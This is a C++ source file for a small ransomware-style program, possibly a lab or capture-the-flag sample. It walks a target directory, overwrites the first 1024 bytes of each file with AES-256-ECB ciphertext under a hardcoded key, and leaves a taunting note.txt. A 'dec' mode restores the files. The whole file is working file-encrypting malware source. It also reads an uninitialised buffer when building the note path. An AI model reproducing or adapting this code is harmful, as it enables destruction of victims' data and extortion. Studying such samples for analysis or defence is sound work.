#include <iostream>
#include <filesystem>
#include <fstream>
#include <thread>
#include <chrono>
#include "aes/AES.h"

using namespace std;

void encrypt(const char *);
void decrypt(const char *);

static const unsigned char key[] = {0x51, 0x9c, 0x48, 0xcf, 0x72, 0xb3, 0xcf, 0x6e, 0xca, 0x73, 0x4e, 0x7c, 0x22, 0x6f, 0x4a, 0x13, 0xcd, 0x74, 0x83, 0x1a, 0xd4, 0xb1, 0xaf, 0x87, 0x7b, 0x38, 0xe9, 0x65, 0x02, 0x75, 0x8a, 0xa4};
static const int encLen = 1024;

static const char *welcomeMsg =
    " .o88b.  .d8b.  d888888b  .o88b. db   db   .88b  d88. d88888b   d888888b d88888b   db    db  .d88b.  db    db    .o88b.  .d8b.  d8b   db\n"
    "d8P  Y8 d8' `8b `~~88~~' d8P  Y8 88   88   88'YbdP`88 88'         `88'   88'       `8b  d8' .8P  Y8. 88    88   d8P  Y8 d8' `8b 888o  88\n"
    "8P      88ooo88    88    8P      88ooo88   88  88  88 88ooooo      88    88ooo      `8bd8'  88    88 88    88   8P      88ooo88 88V8o 88\n"
    "8b      88~~~88    88    8b      88~~~88   88  88  88 88~~~~~      88    88~~~        88    88    88 88    88   8b      88~~~88 88 V8o88\n"
    "Y8b  d8 88   88    88    Y8b  d8 88   88   88  88  88 88.         .88.   88           88    `8b  d8' 88b  d88   Y8b  d8 88   88 88  V888\n"
    " `Y88P' YP   YP    YP     `Y88P' YP   YP   YP  YP  YP Y88888P   Y888888P YP           YP     `Y88P'  ~Y8888P'    `Y88P' YP   YP VP   V8P\n";

int main(int argc, char **argv)
{
    if (argc < 2)
    {
        cout << "Target directory is missing.";
        return 0;
    }
    char *targetDir = argv[1];

    cout << welcomeMsg << endl;

    if (argc >= 3)
    {
        if (strcmp(argv[2], "dec") == 0)
        {
            decrypt(targetDir);
        }
    }
    else
    {
        encrypt(targetDir);
    }
    return 0;
}

void encrypt(const char *targetDir)
{
    char bytes[encLen];
    for (const auto &entry : filesystem::directory_iterator(targetDir))
    {
        string path = entry.path().string();
        if (!filesystem::is_directory(path))
        {
            fstream file(path, ios_base::binary | ios_base::in | ios_base::out);
            if (file && file.is_open())
            {
                file.read(bytes, sizeof(bytes));
                streamsize bytesRead = file.gcount();
                // cout << "read: " << bytesRead << endl;
                int dataLen = (bytesRead / 16) * 16;
                AES aes(AESKeyLength::AES_256);
                unsigned char *enc = aes.EncryptECB(reinterpret_cast<unsigned char *>(bytes), dataLen, key);

                // cout << enc << endl;

                file.seekp(0, ios_base::beg);
                file.write(reinterpret_cast<char *>(enc), dataLen);
                file.flush();
                file.close();
            }
            this_thread::sleep_for(chrono::milliseconds(5000));
        }
    }
    char notePath[128];
    int targetDirLen = strlen(targetDir);
    if (notePath[targetDirLen - 1] == '\\')
    {
        sprintf(notePath, "%s%s", targetDir, "note.txt");
    }
    else
    {
        sprintf(notePath, "%s\\%s", targetDir, "note.txt");
    }
    ofstream note(notePath);
    const char *toWrite = "Do you see anything wrong with your files!! you might wanna look a bit deeper ;)";
    note.write(toWrite, strlen(toWrite));
    note.flush();
    note.close();
}

void decrypt(const char *targetDir)
{
    char bytes[encLen];
    for (const auto &entry : filesystem::directory_iterator(targetDir))
    {
        string path = entry.path().string();
        if (!filesystem::is_directory(path))
        {
            fstream file(path, ios_base::binary | ios_base::in | ios_base::out);
            if (file && file.is_open())
            {
                file.read(bytes, sizeof(bytes));
                streamsize bytesRead = file.gcount();
                // cout << "read: " << bytesRead << endl;
                int dataLen = (bytesRead / 16) * 16;
                AES aes(AESKeyLength::AES_256);
                unsigned char *enc = aes.DecryptECB(reinterpret_cast<unsigned char *>(bytes), dataLen, key);

                // cout << enc << endl;

                file.seekp(0, ios_base::beg);
                file.write(reinterpret_cast<char *>(enc), dataLen);
                file.flush();
                file.close();
            }
            this_thread::sleep_for(chrono::milliseconds(5000));
        }
    }
}
